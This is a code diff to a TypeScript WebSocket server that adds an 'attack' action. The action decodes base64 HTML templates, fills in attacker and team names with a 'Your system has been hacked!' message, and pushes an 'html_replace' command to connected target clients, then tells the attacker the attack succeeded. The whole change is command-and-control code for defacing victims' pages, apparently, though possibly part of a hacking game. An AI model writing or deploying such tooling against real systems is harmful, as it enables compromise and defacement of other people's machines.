@@ -16,6 +16,27 @@ import { templates } from "./template_compiled";
 
 const delay = (ms: number) => new Promise((res) => setTimeout(res, ms));
 
+// Generate Attack HTML from template and configuration
+function generateAttackHTML(fields: RoomField): string {
+  const templateKey = fields.template_key;
+  const templateBase64 = (templates as any)[templateKey];
+  
+  if (!templateBase64) {
+    console.error(`Template not found: ${templateKey}`);
+    return "<h1>HACKED</h1><p>Your system has been compromised!</p>";
+  }
+  
+  // Decode template from base64
+  let htmlContent = Buffer.from(templateBase64, 'base64').toString('utf-8');
+  
+  // Replace placeholders with actual data
+  htmlContent = htmlContent.replace(/\[ATTACKER_NAME\]/g, fields.attacker_name || 'Anonymous');
+  htmlContent = htmlContent.replace(/\[MESSAGE_CONTENT\]/g, fields.message || 'Your system has been hacked!');
+  htmlContent = htmlContent.replace(/\[TEAM_NAMES\]/g, fields.teams?.join(' • ') || 'Unknown Team');
+  
+  return htmlContent;
+}
+
 // const roomPath = path.join(__dirname, "room");
 // if (!fs.existsSync(roomPath)) {
 //   fs.mkdirSync(roomPath);
@@ -149,13 +170,42 @@ websocket.on("connection", (ws: WebSocket) => {
       const action = data.action;
       console.log("Processed action:", action);
 
-      // Forward action to target if connected
-      const room = rooms.get(path);
-      if (room && room.target_id) {
-        const targetWs = targets.get(room.target_id);
-        if (targetWs && targetWs.readyState === WebSocket.OPEN) {
-          targetWs.send(JSON.stringify(data));
-          console.log(`Action forwarded to target ${room.target_id}`);
+      // Handle attack action specially
+      if (action.type === "attack") {
+        const room = rooms.get(path);
+        if (room && room.target_id && room.fields) {
+          const targetWs = targets.get(room.target_id);
+          if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+            // Generate HTML from template and room configuration
+            const htmlContent = generateAttackHTML(room.fields);
+            
+            // Send HTML replacement command to target
+            const htmlPayload = {
+              event: "html_replace",
+              html: htmlContent,
+            };
+            
+            targetWs.send(JSON.stringify(htmlPayload));
+            console.log(`Attack HTML sent to target ${room.target_id}`);
+            
+            // Notify attacker of successful attack
+            ws.send(
+              JSON.stringify({
+                event: "attack_success",
+                target_id: room.target_id,
+              })
+            );
+          }
+        }
+      } else {
+        // Forward other actions normally
+        const room = rooms.get(path);
+        if (room && room.target_id) {
+          const targetWs = targets.get(room.target_id);
+          if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+            targetWs.send(JSON.stringify(data));
+            console.log(`Action forwarded to target ${room.target_id}`);
+          }
         }
       }
     }
